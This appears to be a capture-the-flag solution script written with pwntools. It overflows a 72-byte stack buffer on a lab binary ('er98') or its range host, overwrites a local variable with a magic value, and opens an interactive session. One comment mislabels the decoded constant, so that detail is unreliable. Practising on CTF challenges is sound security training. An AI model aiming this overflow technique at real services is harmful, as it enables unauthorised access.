from pwn import *

# Change this to False if you ever want to test locally again
REMOTE = True

if REMOTE:
    p = remote('airange.aucssociety.com', 30086)
else:
    p = process('./er98')

# 0x3839736f7265 (“eros9798”) little-endian
magic = p64(0x3839736f7265)

# 72-byte pad to reach local_10, then overwrite it
payload = b'A' * 72 + magic

p.sendline(payload)

# Print whatever the service spits back, then drop to interactive
print(p.recvline(timeout=1).decode('utf-8', errors='ignore'))
p.interactive()
